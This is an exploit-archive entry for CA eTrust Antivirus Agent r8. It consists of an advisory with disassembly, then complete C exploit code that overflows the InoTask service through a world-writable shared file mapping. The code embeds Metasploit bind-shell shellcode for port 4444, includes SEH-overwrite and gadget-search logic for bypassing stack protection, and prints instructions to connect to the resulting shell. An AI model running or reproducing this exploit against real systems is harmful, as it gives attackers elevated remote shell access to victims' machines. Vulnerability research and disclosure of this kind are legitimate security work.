source: http://www.securityfocus.com/bid/23906/info

Multiple products by Computer Associates are prone to multiple vulnerabilities that will allow remote attackers to execute arbitrary code on an affected computer.

Successful exploits will allow attacker-supplied arbitrary code to run within the context of the affected server. Failed exploit attempts will likely cause denial-of-service conditions. 

/* 
       ----------------------------------------------------------------------
      | 48Bits Advisory -=- Privilege Elevation in eTrust Antivirus Agent r8 |
       ----------------------------------------------------------------------

 Affected versions :

	I have tested with:

	- eTrust Antivirus Agent r8 - http://www3.ca.com/solutions/Product.aspx?ID=156
                                   (With INOCORE.DLL 8.0.403.0) under XPSP2 and W2KSP4)

 Description :

	eTrust Antivirus r8 is prone to a stack-based buffer overflow vulnerability.

	The Affected component is "eTrust Task service" running as a Windows service, 
	the executable file is located at:

	"%PROGRAMFILES%\CA\eTrustITM\InoTask.exe"

	eTrust Task service uses a shared file mapping named "INOQSIQSYSINFO" as an 
	IPC mechanism, this file mapping have a NULL security descriptor so anyone 
	can view/modify it. This mapping contains information about scheduled tasks,
	including a field where is specified the file job´s path.

	The vulnerable code is located at IN0CORE.DLL in the function QSIGetQueueID 
	which internally calls QSIGetQuePath passing a fixed buffer in order to 
	retrieve the queue path, no validation is done for the buffer size.
	
	In order to exploit the vulnerability, malicious users can modify directly
	the buffer through the file mapping with a long file path, so when InnoTask 
	read it	the mentioned stack-based buffer overflow will be triggered.


 Technical notes about the exploit:
 	
	Although the component was compiled with /GS option is still possible to exploit it:
	
	The IONOQSIQSYSINFO filemapping has enough size to contain a long file path which
	after overflowing return address and SEH Handlers will reach the end of the stack,
	causing an access exception to be raised, then we can point the exception handler
	to a memory containing a (pop,pop,ret) or (call [esp+8]) sequence, this isnt a problem
	for W2K or XPSP1 because we have such sequence in a valid offset in the Inocore.dll
	itself, but could pose one for WXP-SP2 or W2K3 where exception handlers must be
	registered, i have found some addresses valid which can be used at least on my
	test machine under XP-SP2, the PoC i have coded search in AnsiCodePageData
	mapping in order to try to find one valid for your machine if XPSP2 or W2K3 are
	detected, perhaps there are other ways to exploit it in a more efficient way but
	this is only a PoC.
	


 Disassembly: 

////////////////////////////////////////////////////////////////////////////////////////////////

QSIGetQueuePath

.text:6DC82BD0 QSIGetQueuePath proc near               ; CODE XREF: QSIGetQueueUsersFile+24p
.text:6DC82BD0                                         ; QSIGetQueueJobsFile+24p ...
.text:6DC82BD0
.text:6DC82BD0 var_110         = byte ptr -110h
.text:6DC82BD0 var_4           = dword ptr -4
.text:6DC82BD0 arg_0           = dword ptr  8
.text:6DC82BD0 arg_4           = dword ptr  0Ch
.text:6DC82BD0 arg_8           = dword ptr  10h
.text:6DC82BD0 arg_C           = dword ptr  14h
.text:6DC82BD0
.text:6DC82BD0                 push    ebp
.text:6DC82BD1                 mov     ebp, esp
.text:6DC82BD3                 and     esp, 0FFFFFFF8h
.text:6DC82BD6                 sub     esp, 110h
.text:6DC82BDC                 mov     eax, dword_6DC913F8
.text:6DC82BE1                 mov     [esp+110h+var_4], eax
.text:6DC82BE8                 push    esi
.text:6DC82BE9                 mov     esi, [ebp+arg_4]
.text:6DC82BEC                 push    edi
.text:6DC82BED                 xor     eax, eax
.text:6DC82BEF                 mov     [esp+118h+var_110], 0
.text:6DC82BF4                 mov     ecx, 40h
.text:6DC82BF9                 lea     edi, [esp+9]
.text:6DC82BFD                 rep stosd
.text:6DC82BFF                 stosw
.text:6DC82C01                 stosb
.text:6DC82C02                 mov     eax, [ebp+arg_C]
.text:6DC82C05                 test    eax, eax
.text:6DC82C07                 mov     byte ptr [esi], 0
.text:6DC82C0A                 jz      loc_6DC82CA2
.text:6DC82C10                 mov     eax, [ebp+arg_8]
.text:6DC82C13                 test    eax, eax
.text:6DC82C15                 mov     edi, [ebp+arg_0]
.text:6DC82C18                 jnz     short loc_6DC82C2F
.text:6DC82C1A                 mov     ecx, _filemap
.text:6DC82C20                 mov     eax, edi
.text:6DC82C22                 imul    eax, 194h
.text:6DC82C28                 lea     eax, [eax+ecx-144h]
.text:6DC82C2F
.text:6DC82C2F loc_6DC82C2F:                           ; CODE XREF: QSIGetQueuePath+48j
.text:6DC82C2F                 push    eax             ; unsigned __int8 *
.text:6DC82C30                 push    esi             ; unsigned __int8 *
.text:6DC82C31                 call    ds:_mbscpy      <- Here we can trigger the overflow!


And here is the call referenced from QSIGetQueueID ... 

.text:6DC85CF3 loc_6DC85CF3:                           ; CODE XREF: QSIGetQueueID+AAj
.text:6DC85CF3                 push    1               ; int
.text:6DC85CF5                 push    0               ; int
.text:6DC85CF7                 lea     ecx, [esp+120h+var_108] < - Overflowed var
.text:6DC85CFB                 push    ecx             ; unsigned __int8 *
.text:6DC85CFC                 push    eax             ; int
.text:6DC85CFD                 mov     [esp+128h+var_108], 0
.text:6DC85D02                 call    QSIGetQueuePath         <- !!

////////////////////////////////////////////////////////////////////////////////////////////////

 
 References:

  - Defeating the Stack Based Buffer Overflow Prevention Mechanism of Microsoft 
    Windows 2003 Server. (David Litchfield, NGSSoftware).

 Vulnerability discovered and analysis performed by:

   binagres  -=-  binagres[4t]gmail.com
   --
   48Bits[I+D Team]

   www.48bits.com
   blog.48bits.com

*/


#include <stdio.h>
#include <windows.h>

#define Mapping           "Global\\INOQSIQSYSINFO"
#define PathNameOffset	   0x24C
#define HandlerOffset     (0x2F8+PathNameOffset)
#define Base2Search       (BYTE *)(0x7ffb0000)    //	AnsiCodePageData

//#define Off2popAndRet  0x7FFc07A4              <-    This offset works for me on a VMWare witch XPSP2. 

#define NOSP_Off2popAndRet (BYTE *)(0x6DC8102B)   //    Universal offset for SOs without stack protection. 
                                                  //    The address is inside inocore.dll:
                                                  //    pop edi ; xor eax, eax ; pop ebx ; ret


/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com */
static unsigned char scode[] =
"\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd1"
"\xd7\x17\x54\x83\xeb\xfc\xe2\xf4\x2d\xbd\xfc\x19\x39\x2e\xe8\xab"
"\x2e\xb7\x9c\x38\xf5\xf3\x9c\x11\xed\x5c\x6b\x51\xa9\xd6\xf8\xdf"
"\x9e\xcf\x9c\x0b\xf1\xd6\xfc\x1d\x5a\xe3\x9c\x55\x3f\xe6\xd7\xcd"
"\x7d\x53\xd7\x20\xd6\x16\xdd\x59\xd0\x15\xfc\xa0\xea\x83\x33\x7c"
"\xa4\x32\x9c\x0b\xf5\xd6\xfc\x32\x5a\xdb\x5c\xdf\x8e\xcb\x16\xbf"
"\xd2\xfb\x9c\xdd\xbd\xf3\x0b\x35\x12\xe6\xcc\x30\x5a\x94\x27\xdf"
"\x91\xdb\x9c\x24\xcd\x7a\x9c\x14\xd9\x89\x7f\xda\x9f\xd9\xfb\x04"
"\x2e\x01\x71\x07\xb7\xbf\x24\x66\xb9\xa0\x64\x66\x8e\x83\xe8\x84"
"\xb9\x1c\xfa\xa8\xea\x87\xe8\x82\x8e\x5e\xf2\x32\x50\x3a\x1f\x56"
"\x84\xbd\x15\xab\x01\xbf\xce\x5d\x24\x7a\x40\xab\x07\x84\x44\x07"
"\x82\x84\x54\x07\x92\x84\xe8\x84\xb7\xbf\x06\x08\xb7\x84\x9e\xb5"
"\x44\xbf\xb3\x4e\xa1\x10\x40\xab\x07\xbd\x07\x05\x84\x28\xc7\x3c"
"\x75\x7a\x39\xbd\x86\x28\xc1\x07\x84\x28\xc7\x3c\x34\x9e\x91\x1d"
"\x86\x28\xc1\x04\x85\x83\x42\xab\x01\x44\x7f\xb3\xa8\x11\x6e\x03"
"\x2e\x01\x42\xab\x01\xb1\x7d\x30\xb7\xbf\x74\x39\x58\x32\x7d\x04"
"\x88\xfe\xdb\xdd\x36\xbd\x53\xdd\x33\xe6\xd7\xa7\x7b\x29\x55\x79"
"\x2f\x95\x3b\xc7\x5c\xad\x2f\xff\x7a\x7c\x7f\x26\x2f\x64\x01\xab"
"\xa4\x93\xe8\x82\x8a\x80\x45\x05\x80\x86\x7d\x55\x80\x86\x42\x05"
"\x2e\x07\x7f\xf9\x08\xd2\xd9\x07\x2e\x01\x7d\xab\x2e\xe0\xe8\x84"
"\x5a\x80\xeb\xd7\x15\xb3\xe8\x82\x83\x28\xc7\x3c\x21\x5d\x13\x0b"
"\x82\x28\xc1\xab\x01\xd7\x17\x54";



BYTE * find_jmp (BYTE *lpAddress, DWORD dwSize)
{	
	DWORD i;
	BYTE *p;
	BYTE *retval = NULL;	

	for (i=0;i<(dwSize-4);i++)
	{
		p = lpAddress + i;

		//  POP + POP + RET

		if ((p[0] > 0x57) && (p[0] < 0x5F) && (p[1] > 0x57) && (p[1] < 0x5F) && (p[2] > 0xC1) && (p[2] < 0xC4))
		{
			retval = p;
			break;
		}

		//  CALL DWORD PTR [ESP+8]

		if   (   (p[0] == 0xFF) && 
			     (p[1] == 0x54) && 
			     (p[2] == 0x24) && 
			     (p[3]==0x8) )
		{
			retval = p;
			break;
		}
	}

	return retval;

}

void main (int argc, char **argv)
{
	HANDLE hMap;
	BYTE   *lpMap;
	int		i;
	BYTE   *Off2popAndRet=NULL;
	OSVERSIONINFOA  osvi;
	
	printf( " -------------------------------------\n"
		    " Exploit for eTrust Antivirus Agent r8\n"
	        " -------------------------------------\n\n"
	        "binagres -=- binagres[4t]gmail.com\n"
			" --\n"
	        " 48Bits.com\n"
			" blog.48bits.com\n\n");

	       

	printf("Opening file mapping  ... \n");

	if ( (hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS,FALSE, Mapping)) )
	{

		if ( (lpMap = MapViewOfFile(hMap,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0)) )
		{
			// Current file path stored in the mapping.
			printf("Current path %s\n", lpMap+ PathNameOffset);
		}

		else
		{
			printf("Error while Mapping view of file\n");
			return;
		}			

		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		GetVersionEx(&osvi);

		// OS detection ...

		if ( osvi.dwMajorVersion < 5 )
		{
			printf("Using universal offset\n");
			Off2popAndRet = NOSP_Off2popAndRet;
		}

		else
		{
			switch (osvi.dwMinorVersion)
			{
			case 0: 
				printf("W2K detected: using universal offset\n");
				Off2popAndRet = NOSP_Off2popAndRet;
				break;

			case 1:

				if (lstrcmpi("Service Pack 2", osvi.szCSDVersion))
				{
					Off2popAndRet = NOSP_Off2popAndRet;
					printf("WXP - %s - detected, using universal offset\n",osvi.szCSDVersion);
				}

				else
				{
					printf("WXP - SP2 Detected no universal offset\n");
				}
				break;

			case 2:
				printf("W2K3 - %s - detected no universal offset\n");
				break;
			}
		}
		

		// Try to find the jmpcode by other way...

		if (!Off2popAndRet)
		{
			Off2popAndRet = find_jmp(Base2Search,0x20000);
		}
		

		// Have we any jmp code?
		
		if(Off2popAndRet)
		{

			printf("Valid Offset found at 0x%p!!\n", Off2popAndRet);

			// Write Shellcode

			for ( i = 0 ; i< sizeof(scode) ; i++ )
			{
				*(lpMap+ PathNameOffset + i) = scode[i];
			}

			// Fill the rest of the map - we want an access exception!! :-)

			for ( i = PathNameOffset + sizeof(scode) - 1; i<0x1000 ; i++ )
			{
				*(lpMap+i) = 0x90;
			}
			
			// Offsets and jmps party 
			
			* ((DWORD *)(lpMap+ HandlerOffset - 4)) = 0x909006EB; // jmp $+6
			* ((DWORD *)(lpMap+ HandlerOffset)) = (DWORD) Off2popAndRet;
			* ((DWORD *)(lpMap+ HandlerOffset + 4)) = 0xFFFCFFE9; //  for..
			* ((BYTE  *)(lpMap+ HandlerOffset + 8)) = 0xFF;       //  jmp (shellcode)

			printf("Attack launched ... wait a few seconds and try \"telnet localhost 4444\" \n");

		}	

		else
		{
			printf("Cannot find a jmpcode try it by yourself :-(\n");
		}
	}

	else 
	{
		printf("Cannot find eTrust filemapping\n");
	}
}